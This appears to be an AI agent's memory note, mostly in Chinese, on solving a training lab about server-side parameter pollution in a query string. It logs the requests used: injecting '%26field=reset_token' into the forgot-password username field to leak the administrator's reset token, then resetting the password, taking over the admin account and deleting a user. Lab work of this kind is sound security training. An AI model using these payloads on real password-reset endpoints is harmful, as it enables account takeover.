---
metadata:
  node_type: memory
name: "PRS lab solve server-side parameter pollution query string"
description: "arm A 基线:lab-exploiting-server-side-parameter-pollution-in-query-string 冷实例一次通过 - forgot-password username 注入 %26field=reset_token 泄管理员重置令牌"
last_updated: 2026-10-08T19:17:05+08:00
created: 2026-10-08T19:17:05+08:00
---

## 2026-10-08 arm A 基线

- 实例:range_launch widget-lab-id D74FC3117A595F2183EB88A24360BB9C2A7472A910E4E97B4907971835D1F4E3(jar /tmp/cj1.json,reused:false),base https://0a4f00dc04e0d2eb80a09939003c00d3.web-security-academy.net/
- 题面:topic 页 /web-security/api-testing/server-side-parameter-pollution 的 widget 同时挂两题,query-string 题=D74F…,REST-URL 题=4967…;给定 lab 路径 server-side-parameter-pollution 取前者。
- 链:POST /forgot-password(username 字段)
  1. username=administrator → {"type":"email","result":"*****@normal-user.net"}
  2. username=administrator%23 → {"error":"Field not specified."}(截断成立)
  3. username=administrator%26field=x → {"type":"ClientError","code":400,"error":"Invalid field."}
  4. username=administrator%26field=reset_token → {"type":"reset_token","result":"<32hex>"}  ← 令牌直泄
  5. GET /forgot-password?reset_token=<token> → 带 csrf+reset_token+new-password-1/2 的重置表单
  6. POST 该表单同 token → 302,管理员口令改定
- 后续:POST /login(administrator/新口令)→ GET /admin → GET /admin/delete?username=carlos → banner is-solved。
- 件:cache_probe(需 {"base":...,"requests":[...]} 包装 + --base;裸数组报 no base url / no requests)、http_session、range_launch、page_read 取 widget-lab-id。
- 坑:page_read 猜的 lab slug(.../lab-exploiting-server-side-parameter-pollution-in-a-query-string)404;直接从 topic 页拿 widget-lab-id 即可。
- 耗时:约 8 次件调用一次通过,无 failed 分支。

